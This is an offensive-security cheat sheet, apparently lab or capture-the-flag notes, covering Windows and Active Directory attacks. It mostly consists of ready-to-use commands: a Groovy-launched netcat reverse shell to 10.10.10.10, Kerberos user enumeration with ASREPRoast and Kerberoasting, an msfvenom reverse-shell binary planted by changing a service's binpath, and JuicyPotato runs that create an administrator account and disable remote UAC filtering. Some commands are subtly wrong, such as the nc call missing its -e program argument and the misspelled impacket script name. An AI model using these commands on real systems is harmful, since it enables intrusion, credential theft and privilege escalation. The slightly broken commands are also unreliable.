# OWASP Top 10

## Command Injection

### Ask Jeeves

```powershell
# Shared resource
println "\\\\10.10.10.10\\smbFolder\\nc.exe -e 10.10.10.10 443".execute().text
```
------------------------------------------------------------------------------------------------------
# Windows Section

# Kerberos

## Enumerating valid users

[kerbrute](https://github.com/ropnop/kerbrute)

Find **valid** domain controller users

```powershell
kerbrute userenum --dc 10.10.10.250 -d domain.local users.list
```

Combinating with [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)

Find **ASREPRoast** users

```powershell
GetNPUsers.py domain.local/ --no-pass -usersfile valid_users.list
```

Find **Kerberoasting** users

Combinating with [GetUsersSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)

```powershell
GetUsersSPNs.py 'domain.local/jan:password'
```

# Windows Privilege Escalation Techniques

## Abusing groups

### Server Operators
Create/Modify Services

```powershell
# MSFVenom Reverse Shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > shell.exe

# Modiying binary
sc.exe config VMTools binpath="C:\Users\Janrdz\Desktop\shell.exe"
```
## Abusing Privileges

### SeImpersonatePrivilege
#### [JuicyPotato](https://github.com/k4sth4/Juicy-Potato)

```powershell
JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user jan jan /add" -l 1337
JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators jan /add" -l 1337
JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
```

# Extra

## Alternate Data Streams (Windows)

ADS (Alternate Data Stream): is the ability to branch data into existing files without changing or altering its functionality, size or display to file browsing utilities.

```command
dir /r /s
more < ads.txt
more < ads.txt:file.txt
```
